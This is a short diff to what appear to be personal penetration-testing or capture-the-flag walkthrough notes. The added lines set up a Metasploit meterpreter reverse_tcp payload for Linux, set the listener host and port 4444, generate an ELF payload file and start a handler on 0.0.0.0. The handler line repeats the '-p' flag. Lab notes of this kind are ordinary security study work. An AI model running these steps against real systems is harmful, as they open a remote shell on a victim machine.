@@ -626,5 +626,9 @@ walkthrough
 		curl -v $TGT using the functions
 	msfconsole
 		payload/linux/x86/meterpreter/reverse_tcp
-		set LOHOST
-		set prepend
+		set LHOST ip
+		set LPORT 4444
+		set prepend true
+		generate -f elf -o filename
+		handler -p payload -H 0.0.0.0 -p 4444
+		
